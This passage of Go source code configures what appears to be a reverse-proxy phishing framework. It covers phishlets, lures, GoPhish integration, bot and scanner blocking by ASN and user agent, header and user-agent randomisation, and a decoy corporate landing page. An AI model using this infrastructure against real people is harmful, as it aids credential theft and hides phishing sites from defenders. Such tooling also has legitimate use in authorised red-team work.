			// 	if host == l.Hostname || host == pl.GetLandingPhishHost() {
			// 		if l.Path == path {
			// 			return l, nil
			// 		}
			// 	}
			// }
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

func (c *Config) GetGophishDBPath() string {
	return c.gophishConfig.DBPath
}

func (c *Config) SetGophishDBPath(path string) {
	c.gophishConfig.DBPath = path
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	c.cfg.WriteConfig()
}

// EvilFeed configuration methods
func (c *Config) GetEvilFeedEnabled() bool {
	return c.evilfeedConfig.Enabled
}

func (c *Config) GetEvilFeedEndpoint() string {
	return c.evilfeedConfig.Endpoint
}

func (c *Config) SetEvilFeedEnabled(enabled bool) {
	c.evilfeedConfig.Enabled = enabled
	c.cfg.Set(CFG_EVILFEED, c.evilfeedConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetEvilFeedEndpoint(endpoint string) {
	c.evilfeedConfig.Endpoint = endpoint
	c.cfg.Set(CFG_EVILFEED, c.evilfeedConfig)
	c.cfg.WriteConfig()
}

// GetLures returns all lures
func (c *Config) GetLures() []*Lure {
	return c.lures
}

// GetPhishlets returns all phishlets
func (c *Config) GetPhishlets() map[string]*Phishlet {
	return c.phishlets
}

// GetServerDomain returns the base domain
func (c *Config) GetServerDomain() string {
	return c.general.Domain
}

// Turnstile configuration methods
func (c *Config) GetTurnstileConfig() *TurnstileConfig {
	return c.turnstileConfig
}

func (c *Config) GetTurnstileEnabled() bool {
	return c.turnstileConfig.Enabled
}

func (c *Config) GetTurnstileSiteKey() string {
	return c.turnstileConfig.SiteKey
}

func (c *Config) GetTurnstileSecretKey() string {
	return c.turnstileConfig.SecretKey
}

func (c *Config) SetTurnstileEnabled(enabled bool) {
	c.turnstileConfig.Enabled = enabled
	c.cfg.Set(CFG_TURNSTILE, c.turnstileConfig)
	if enabled {
		log.Info("turnstile verification enabled")
	} else {
		log.Info("turnstile verification disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetTurnstileSiteKey(sitekey string) {
	c.turnstileConfig.SiteKey = sitekey
	c.cfg.Set(CFG_TURNSTILE, c.turnstileConfig)
	log.Info("turnstile sitekey set")
	c.cfg.WriteConfig()
}

func (c *Config) SetTurnstileSecretKey(secretkey string) {
	c.turnstileConfig.SecretKey = secretkey
	c.cfg.Set(CFG_TURNSTILE, c.turnstileConfig)
	log.Info("turnstile secretkey set")
	c.cfg.WriteConfig()
}

// RequestChecker configuration methods
func (c *Config) GetRequestCheckerConfig() *RequestCheckerConfig {
	return c.requestCheckerConfig
}

func (c *Config) GetRequestCheckerEnabled() bool {
	return c.requestCheckerConfig.Enabled
}

func (c *Config) GetRequestCheckerASNFile() string {
	return c.requestCheckerConfig.ASNFile
}

func (c *Config) GetRequestCheckerUserAgentFile() string {
	return c.requestCheckerConfig.UserAgentFile
}

func (c *Config) GetRequestCheckerIPRangeFile() string {
	return c.requestCheckerConfig.IPRangeFile
}

func (c *Config) GetRequestCheckerIPListFile() string {
	return c.requestCheckerConfig.IPListFile
}

func (c *Config) GetRequestCheckerVerbose() bool {
	return c.requestCheckerConfig.Verbose
}

func (c *Config) SetRequestCheckerEnabled(enabled bool) {
	c.requestCheckerConfig.Enabled = enabled
	c.cfg.Set(CFG_REQUEST_CHECKER, c.requestCheckerConfig)
	if enabled {
		log.Info("[RequestChecker] blocking enabled")
	} else {
		log.Info("[RequestChecker] blocking disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetRequestCheckerVerbose(verbose bool) {
	c.requestCheckerConfig.Verbose = verbose
	c.cfg.Set(CFG_REQUEST_CHECKER, c.requestCheckerConfig)
	if verbose {
		log.Info("[RequestChecker] verbose logging enabled")
	} else {
		log.Info("[RequestChecker] verbose logging disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetRequestCheckerASNFile(path string) {
	c.requestCheckerConfig.ASNFile = path
	c.cfg.Set(CFG_REQUEST_CHECKER, c.requestCheckerConfig)
	log.Info("[RequestChecker] ASN file set to: %s", path)
	c.cfg.WriteConfig()
}

func (c *Config) SetRequestCheckerUserAgentFile(path string) {
	c.requestCheckerConfig.UserAgentFile = path
	c.cfg.Set(CFG_REQUEST_CHECKER, c.requestCheckerConfig)
	log.Info("[RequestChecker] User-Agent file set to: %s", path)
	c.cfg.WriteConfig()
}

func (c *Config) SetRequestCheckerIPRangeFile(path string) {
	c.requestCheckerConfig.IPRangeFile = path
	c.cfg.Set(CFG_REQUEST_CHECKER, c.requestCheckerConfig)
	log.Info("[RequestChecker] IP range file set to: %s", path)
	c.cfg.WriteConfig()
}

func (c *Config) SetRequestCheckerIPListFile(path string) {
	c.requestCheckerConfig.IPListFile = path
	c.cfg.Set(CFG_REQUEST_CHECKER, c.requestCheckerConfig)
	log.Info("[RequestChecker] IP list file set to: %s", path)
	c.cfg.WriteConfig()
}

// Cloudflare configuration methods (for wildcard certificates via DNS-01 challenge)
func (c *Config) GetCloudflareConfig() *CloudflareConfig {
	return c.cloudflareConfig
}

func (c *Config) GetCloudflareAPIToken() string {
	if c.cloudflareConfig == nil {
		return ""
	}
	return c.cloudflareConfig.APIToken
}

func (c *Config) GetCloudflareWildcardEnabled() bool {
	if c.cloudflareConfig == nil {
		return false
	}
	return c.cloudflareConfig.WildcardEnabled
}

func (c *Config) SetCloudflareAPIToken(token string) {
	if c.cloudflareConfig == nil {
		c.cloudflareConfig = &CloudflareConfig{}
	}
	c.cloudflareConfig.APIToken = token
	c.cfg.Set(CFG_CLOUDFLARE, c.cloudflareConfig)
	if token != "" {
		log.Info("[Cloudflare] API token set (for wildcard certificates)")
	} else {
		log.Info("[Cloudflare] API token cleared")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetCloudflareWildcardEnabled(enabled bool) {
	if c.cloudflareConfig == nil {
		c.cloudflareConfig = &CloudflareConfig{}
	}
	c.cloudflareConfig.WildcardEnabled = enabled
	c.cfg.Set(CFG_CLOUDFLARE, c.cloudflareConfig)
	if enabled {
		if c.cloudflareConfig.APIToken == "" {
			log.Warning("[Cloudflare] wildcard certificates enabled but API token not set!")
			log.Warning("[Cloudflare] use 'config cloudflare api_token <token>' to set your Cloudflare API token")
		} else {
			log.Info("[Cloudflare] wildcard certificates enabled")
		}
	} else {
		log.Info("[Cloudflare] wildcard certificates disabled (using per-subdomain certs)")
	}
	c.cfg.WriteConfig()
}

// IsCloudflareWildcardReady returns true if Cloudflare is configured and wildcard is enabled
func (c *Config) IsCloudflareWildcardReady() bool {
	return c.cloudflareConfig != nil &&
		c.cloudflareConfig.WildcardEnabled &&
		c.cloudflareConfig.APIToken != ""
}

// Anonymity configuration methods
func (c *Config) GetAnonymityConfig() *AnonymityConfigPersist {
	return c.anonymityConfig
}

func (c *Config) GetAnonymityEnabled() bool {
	if c.anonymityConfig == nil {
		return false
	}
	return c.anonymityConfig.Enabled
}

func (c *Config) GetAnonymityHeaderRandomization() bool {
	if c.anonymityConfig == nil {
		return false
	}
	return c.anonymityConfig.HeaderRandomization
}

func (c *Config) GetAnonymityUserAgentRotation() bool {
	if c.anonymityConfig == nil {
		return false
	}
	return c.anonymityConfig.UserAgentRotation
}

func (c *Config) SetAnonymityEnabled(enabled bool) {
	if c.anonymityConfig == nil {
		c.anonymityConfig = &AnonymityConfigPersist{}
	}
	c.anonymityConfig.Enabled = enabled
	c.cfg.Set(CFG_ANONYMITY, c.anonymityConfig)
	if enabled {
		log.Info("[Anonymity] engine enabled")
	} else {
		log.Info("[Anonymity] engine disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPoolEnabled(enabled bool) {
	if c.anonymityConfig == nil {
		c.anonymityConfig = &AnonymityConfigPersist{}
	}
	c.anonymityConfig.ProxyPoolEnabled = enabled
	c.cfg.Set(CFG_ANONYMITY, c.anonymityConfig)
	c.cfg.WriteConfig()
}

func (c *Config) GetProxyPoolEnabled() bool {
	if c.anonymityConfig == nil {
		return false
	}
	return c.anonymityConfig.ProxyPoolEnabled
}

func (c *Config) SetAnonymityHeaderRandomization(enabled bool) {
	if c.anonymityConfig == nil {
		c.anonymityConfig = &AnonymityConfigPersist{}
	}
	c.anonymityConfig.HeaderRandomization = enabled
	c.cfg.Set(CFG_ANONYMITY, c.anonymityConfig)
	if enabled {
		log.Info("[Anonymity] header randomization enabled")
	} else {
		log.Info("[Anonymity] header randomization disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetAnonymityUserAgentRotation(enabled bool) {
	if c.anonymityConfig == nil {
		c.anonymityConfig = &AnonymityConfigPersist{}
	}
	c.anonymityConfig.UserAgentRotation = enabled
	c.cfg.Set(CFG_ANONYMITY, c.anonymityConfig)
	if enabled {
		log.Info("[Anonymity] user-agent rotation enabled")
	} else {
		log.Info("[Anonymity] user-agent rotation disabled")
	}
	c.cfg.WriteConfig()
}

// Internal API configuration methods (for EvilFeed communication)
const DEFAULT_INTERNAL_API_PORT = 8888

func (c *Config) GetInternalAPIPort() int {
	if c.general.InternalAPIPort == 0 {
		return DEFAULT_INTERNAL_API_PORT
	}
	return c.general.InternalAPIPort
}

func (c *Config) SetInternalAPIPort(port int) {
	c.general.InternalAPIPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("internal API port set to: %d", port)
	c.cfg.WriteConfig()
}

// ============================================================================
// Admin Panel Configuration Methods (EvilFeed/GoPhish on base domain)
// ============================================================================

// GetAdminPanelConfig returns the admin panel configuration
func (c *Config) GetAdminPanelConfig() *AdminPanelConfig {
	if c.adminPanelConfig == nil {
		c.adminPanelConfig = &AdminPanelConfig{
			AdminEnabled:    false,
			AdminPath:       "/admin/",
			AdminBackend:    "http://127.0.0.1:1337",
			MailEnabled:     false,
			MailPath:        "/mail/",
			MailBackend:     "http://127.0.0.1:3333",
			LandingEnabled:  true,
			LandingTitle:    "Welcome",
			LandingCompany:  "Secure Solutions Inc.",
			LandingTagline:  "Enterprise Security & Cloud Services",
			LandingCategory: "tech",
		}
	}
	return c.adminPanelConfig
}

// IsAdminPanelEnabled returns true if admin panel (/admin/) is enabled
func (c *Config) IsAdminPanelEnabled() bool {
	return c.GetAdminPanelConfig().AdminEnabled
}

// IsMailPanelEnabled returns true if mail panel (/mail/) is enabled
func (c *Config) IsMailPanelEnabled() bool {
	return c.GetAdminPanelConfig().MailEnabled
}

// IsLandingPageEnabled returns true if landing page is enabled
// Landing page is always auto-enabled when base domain is set
func (c *Config) IsLandingPageEnabled() bool {
	// Auto-enabled: landing page is always shown on base domain
	// unless admin or mail panel is handling the request
	return c.general.Domain != ""
}

// IsBaseDomainActive returns true if base domain should be active (any panel or landing enabled)
func (c *Config) IsBaseDomainActive() bool {
	cfg := c.GetAdminPanelConfig()
	return cfg.AdminEnabled || cfg.MailEnabled || cfg.LandingEnabled
}

// SetAdminPanelEnabled enables/disables the admin panel (/admin/ -> EvilFeed)
func (c *Config) SetAdminPanelEnabled(enabled bool) {
	c.GetAdminPanelConfig().AdminEnabled = enabled
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	if enabled {
		log.Info("[AdminPanel] /admin/ route enabled -> EvilFeed (%s)", c.adminPanelConfig.AdminBackend)
	} else {
		log.Info("[AdminPanel] /admin/ route disabled")
	}
	c.cfg.WriteConfig()
}

// SetMailPanelEnabled enables/disables the mail panel (/mail/ -> GoPhish)
func (c *Config) SetMailPanelEnabled(enabled bool) {
	c.GetAdminPanelConfig().MailEnabled = enabled
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	if enabled {
		log.Info("[AdminPanel] /mail/ route enabled -> GoPhish (%s)", c.adminPanelConfig.MailBackend)
	} else {
		log.Info("[AdminPanel] /mail/ route disabled")
	}
	c.cfg.WriteConfig()
}

// SetLandingPageEnabled enables/disables the landing page
func (c *Config) SetLandingPageEnabled(enabled bool) {
	c.GetAdminPanelConfig().LandingEnabled = enabled
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	if enabled {
		log.Info("[AdminPanel] landing page enabled for base domain")
	} else {
		log.Info("[AdminPanel] landing page disabled")
	}
	c.cfg.WriteConfig()
}

// SetAdminBackend sets the backend URL for admin panel
func (c *Config) SetAdminBackend(backend string) {
	c.GetAdminPanelConfig().AdminBackend = backend
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	log.Info("[AdminPanel] admin backend set to: %s", backend)
	c.cfg.WriteConfig()
}

// SetMailBackend sets the backend URL for mail panel
func (c *Config) SetMailBackend(backend string) {
	c.GetAdminPanelConfig().MailBackend = backend
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	log.Info("[AdminPanel] mail backend set to: %s", backend)
	c.cfg.WriteConfig()
}

// GetAdminPath returns the admin panel path (default: /admin/)
func (c *Config) GetAdminPath() string {
	path := c.GetAdminPanelConfig().AdminPath
	if path == "" {
		return "/admin/"
	}
	return path
}

// GetMailPath returns the mail panel path (default: /mail/)
func (c *Config) GetMailPath() string {
	path := c.GetAdminPanelConfig().MailPath
	if path == "" {
		return "/mail/"
	}
	return path
}

// GetAdminBackend returns the admin backend URL
func (c *Config) GetAdminBackend() string {
	backend := c.GetAdminPanelConfig().AdminBackend
	if backend == "" {
		return "http://127.0.0.1:1337"
	}
	return backend
}

// GetMailBackend returns the mail backend URL
func (c *Config) GetMailBackend() string {
	backend := c.GetAdminPanelConfig().MailBackend
	if backend == "" {
		return "http://127.0.0.1:3333"
	}
	return backend
}

// SetLandingTitle sets the landing page title
func (c *Config) SetLandingTitle(title string) {
	c.GetAdminPanelConfig().LandingTitle = title
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	log.Info("[AdminPanel] landing title set to: %s", title)
	c.cfg.WriteConfig()
}

// SetLandingCompany sets the landing page company name
func (c *Config) SetLandingCompany(company string) {
	c.GetAdminPanelConfig().LandingCompany = company
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	log.Info("[AdminPanel] landing company set to: %s", company)
	c.cfg.WriteConfig()
}

// SetLandingTagline sets the landing page tagline
func (c *Config) SetLandingTagline(tagline string) {
	c.GetAdminPanelConfig().LandingTagline = tagline
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	log.Info("[AdminPanel] landing tagline set to: %s", tagline)
	c.cfg.WriteConfig()
}

// SetLandingCategory sets the landing page category (tech, finance, healthcare, education, etc.)
func (c *Config) SetLandingCategory(category string) {
	validCategories := []string{"tech", "finance", "healthcare", "education", "legal", "consulting", "marketing", "retail"}
	if !stringExists(category, validCategories) {
		log.Warning("[AdminPanel] invalid category '%s', valid options: %v", category, validCategories)
		return
	}
	c.GetAdminPanelConfig().LandingCategory = category
	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
	log.Info("[AdminPanel] landing category set to: %s", category)
	c.cfg.WriteConfig()
}

// GetLandingTitle returns the landing page title
func (c *Config) GetLandingTitle() string {
	title := c.GetAdminPanelConfig().LandingTitle
	if title == "" {
		return "Welcome"
	}
	return title
}

// GetLandingCompany returns the landing page company name
func (c *Config) GetLandingCompany() string {
	company := c.GetAdminPanelConfig().LandingCompany
	if company == "" {
		return "Secure Solutions Inc."
	}
	return company
}

// GetLandingTagline returns the landing page tagline
func (c *Config) GetLandingTagline() string {
	tagline := c.GetAdminPanelConfig().LandingTagline
	if tagline == "" {
		return "Enterprise Security & Cloud Services"
	}
	return tagline
}

// GetLandingCategory returns the landing page category
func (c *Config) GetLandingCategory() string {
	category := c.GetAdminPanelConfig().LandingCategory
	if category == "" {
		return "tech"
	}
	return category
}

// LoadAdminPanelConfig loads admin panel config from file
func (c *Config) LoadAdminPanelConfig() {
	c.cfg.UnmarshalKey(CFG_ADMIN_PANEL, &c.adminPanelConfig)
	if c.adminPanelConfig == nil {
		c.adminPanelConfig = &AdminPanelConfig{
			AdminEnabled:    false,
			AdminPath:       "/admin/",
			AdminBackend:    "http://127.0.0.1:1337",
			MailEnabled:     false,
			MailPath:        "/mail/",
			MailBackend:     "http://127.0.0.1:3333",
			LandingEnabled:  true,
			LandingTitle:    "Welcome",
			LandingCompany:  "Secure Solutions Inc.",
			LandingTagline:  "Enterprise Security & Cloud Services",
			LandingCategory: "tech",
		}
	}
}
